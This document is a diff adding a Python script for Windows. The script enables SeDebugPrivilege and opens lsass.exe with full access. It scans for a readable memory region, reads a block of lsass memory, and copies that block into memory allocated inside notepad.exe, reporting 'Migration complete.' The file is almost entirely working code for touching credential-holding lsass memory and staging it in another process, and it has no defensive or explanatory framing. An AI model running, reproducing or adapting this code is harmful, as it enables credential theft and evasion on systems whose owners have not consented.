@@ -1,0 +1,244 @@
+import ctypes
+import win32api
+import win32security
+import win32con
+import sys
+import struct
+import platform
+import psutil
+
+# Constants
+PROCESS_ALL_ACCESS = 0x1F0FFF
+PAGE_READWRITE = 0x04
+MEM_COMMIT = 0x1000
+MEM_RESERVE = 0x2000
+
+# Define ctypes types
+HANDLE = ctypes.c_void_p
+LPVOID = ctypes.c_void_p
+LPCVOID = ctypes.c_void_p
+SIZE_T = ctypes.c_size_t
+DWORD = ctypes.c_ulong
+BOOL = ctypes.c_bool
+
+# Define MEMORY_BASIC_INFORMATION structure
+class MEMORY_BASIC_INFORMATION(ctypes.Structure):
+    _fields_ = [
+        ("BaseAddress", LPVOID),
+        ("AllocationBase", LPVOID),
+        ("AllocationProtect", DWORD),
+        ("RegionSize", SIZE_T),
+        ("State", DWORD),
+        ("Protect", DWORD),
+        ("Type", DWORD),
+    ]
+
+def enable_debug_privilege():
+    try:
+        privilege = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
+        token_handle = win32security.OpenProcessToken(
+            win32api.GetCurrentProcess(),
+            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
+        )
+        privileges = [(privilege, win32security.SE_PRIVILEGE_ENABLED)]
+        win32security.AdjustTokenPrivileges(token_handle, False, privileges)
+        win32api.CloseHandle(token_handle)
+        print("SeDebugPrivilege enabled.")
+    except Exception as e:
+        print(f"Failed to enable SeDebugPrivilege: {e}")
+        sys.exit(1)
+
+def get_pid(process_name):
+    """Dynamically retrieve the PID of a process by name."""
+    for proc in psutil.process_iter(['pid', 'name']):
+        if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
+            return proc.info['pid']
+    return None
+
+def main():
+    # Print Python and Platform Architecture
+    python_arch = '64-bit' if struct.calcsize("P") * 8 == 64 else '32-bit'
+    platform_arch = platform.architecture()[0]
+    print(f"Python Architecture: {python_arch}")
+    print(f"Platform Architecture: {platform_arch}")
+
+    # Enable SeDebugPrivilege
+    enable_debug_privilege()
+
+    # Retrieve PIDs dynamically
+    LSASS_PID = get_pid('lsass.exe')
+    NOTEPAD_PID = get_pid('notepad.exe')
+
+    if not LSASS_PID:
+        print("Could not find lsass.exe.")
+        sys.exit(1)
+    if not NOTEPAD_PID:
+        print("Could not find notepad.exe.")
+        sys.exit(1)
+
+    # Open lsass.exe process
+    try:
+        lsass_handle = win32api.OpenProcess(PROCESS_ALL_ACCESS, False, LSASS_PID)
+        lsass_handle_int = int(lsass_handle)
+        print(f"Opened lsass.exe with PID {LSASS_PID}, Handle: {hex(lsass_handle_int)}")
+    except Exception as e:
+        print(f"Failed to open lsass.exe: {e}")
+        sys.exit(1)
+
+    # Open notepad.exe process
+    try:
+        notepad_handle = win32api.OpenProcess(PROCESS_ALL_ACCESS, False, NOTEPAD_PID)
+        notepad_handle_int = int(notepad_handle)
+        print(f"Opened notepad.exe with PID {NOTEPAD_PID}, Handle: {hex(notepad_handle_int)}")
+    except Exception as e:
+        print(f"Failed to open notepad.exe: {e}")
+        win32api.CloseHandle(lsass_handle)
+        sys.exit(1)
+
+    # Load kernel32.dll
+    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+
+    # Define VirtualQueryEx
+    VirtualQueryEx = kernel32.VirtualQueryEx
+    VirtualQueryEx.argtypes = [HANDLE, LPCVOID, ctypes.POINTER(MEMORY_BASIC_INFORMATION), SIZE_T]
+    VirtualQueryEx.restype = SIZE_T
+
+    # Define VirtualAllocEx
+    VirtualAllocEx = kernel32.VirtualAllocEx
+    VirtualAllocEx.argtypes = [HANDLE, LPVOID, SIZE_T, DWORD, DWORD]
+    VirtualAllocEx.restype = LPVOID
+
+    # Define ReadProcessMemory
+    ReadProcessMemory = kernel32.ReadProcessMemory
+    ReadProcessMemory.argtypes = [HANDLE, LPCVOID, LPVOID, SIZE_T, ctypes.POINTER(SIZE_T)]
+    ReadProcessMemory.restype = BOOL
+
+    # Define WriteProcessMemory
+    WriteProcessMemory = kernel32.WriteProcessMemory
+    WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPVOID, SIZE_T, ctypes.POINTER(SIZE_T)]
+    WriteProcessMemory.restype = BOOL
+
+    # Function to find a readable memory region in lsass.exe
+    def find_readable_region():
+        memory_info = MEMORY_BASIC_INFORMATION()
+        address = 0
+        max_address = 0x7fffffffffff  # User-mode memory limit on Windows
+
+        print("Scanning memory regions in lsass.exe to find a readable region...")
+
+        while address < max_address:
+            bytes_returned = VirtualQueryEx(
+                HANDLE(lsass_handle_int),
+                LPCVOID(address),
+                ctypes.byref(memory_info),
+                ctypes.sizeof(memory_info)
+            )
+
+            if bytes_returned == 0:
+                break  # No more regions to query
+
+            # Debug: Print current memory region info
+            # Uncomment the following lines for detailed debugging
+            # print(f"Queried address: {hex(address)}, Bytes returned: {bytes_returned}")
+            # print(f"  BaseAddress: {hex(memory_info.BaseAddress)}")
+            # print(f"  AllocationBase: {hex(memory_info.AllocationBase)}")
+            # print(f"  RegionSize: {memory_info.RegionSize}")
+            # print(f"  State: {memory_info.State}")
+            # print(f"  Protect: {memory_info.Protect}")
+            # print(f"  Type: {memory_info.Type}")
+
+            # Check if the memory region is committed and readable
+            if (memory_info.State == MEM_COMMIT and
+                memory_info.Protect in (
+                    win32con.PAGE_READONLY,
+                    win32con.PAGE_READWRITE,
+                    win32con.PAGE_EXECUTE_READ,
+                    win32con.PAGE_EXECUTE_READWRITE
+                )):
+                print(f"Found readable memory region at: {hex(memory_info.BaseAddress)}")
+                return memory_info.BaseAddress, memory_info.RegionSize
+
+            address += memory_info.RegionSize
+
+        print("No readable memory regions found in lsass.exe.")
+        return None, None
+
+    # Find a readable memory region in lsass.exe
+    valid_memory_region, region_size = find_readable_region()
+
+    if not valid_memory_region:
+        print("No valid memory regions found in lsass.exe.")
+        win32api.CloseHandle(lsass_handle)
+        win32api.CloseHandle(notepad_handle)
+        sys.exit(1)
+
+    # Print buffer_size
+    buffer_size = 0x1000  # 4096 bytes (fixed small size for testing)
+    print(f"Buffer size to allocate: {buffer_size} bytes")
+
+    # Attempt to allocate memory in notepad.exe
+    allocated_memory = VirtualAllocEx(
+        HANDLE(notepad_handle_int),  # Pass handle as integer
+        None,                        # Let the system choose the address
+        buffer_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    )
+
+    if not allocated_memory:
+        error_code = ctypes.get_last_error()
+        print(f"Memory allocation failed in notepad.exe. Error code: {error_code}")
+        win32api.CloseHandle(lsass_handle)
+        win32api.CloseHandle(notepad_handle)
+        sys.exit(1)
+
+    print(f"Memory allocated at {hex(allocated_memory)} in notepad.exe.")
+
+    # Read memory from lsass.exe
+    buffer = ctypes.create_string_buffer(buffer_size)
+    bytes_read = SIZE_T()
+
+    success = ReadProcessMemory(
+        HANDLE(lsass_handle_int),
+        LPCVOID(valid_memory_region),
+        buffer,
+        buffer_size,
+        ctypes.byref(bytes_read)
+    )
+
+    if not success:
+        error_code = ctypes.get_last_error()
+        print(f"Failed to read memory from lsass.exe. Error code: {error_code}")
+        win32api.CloseHandle(lsass_handle)
+        win32api.CloseHandle(notepad_handle)
+        sys.exit(1)
+
+    print(f"Read {bytes_read.value} bytes from lsass.exe.")
+
+    # Write memory into notepad.exe
+    bytes_written = SIZE_T()
+
+    success = WriteProcessMemory(
+        HANDLE(notepad_handle_int),
+        LPVOID(allocated_memory),
+        buffer,
+        bytes_read.value,
+        ctypes.byref(bytes_written)
+    )
+
+    if not success:
+        error_code = ctypes.get_last_error()
+        print(f"Failed to write memory into notepad.exe. Error code: {error_code}")
+        win32api.CloseHandle(lsass_handle)
+        win32api.CloseHandle(notepad_handle)
+        sys.exit(1)
+
+    print(f"Wrote {bytes_written.value} bytes to notepad.exe.")
+
+    # Cleanup
+    win32api.CloseHandle(lsass_handle)
+    win32api.CloseHandle(notepad_handle)
+    print("Handles closed. Migration complete.")
+
+if __name__ == "__main__":
+    main()
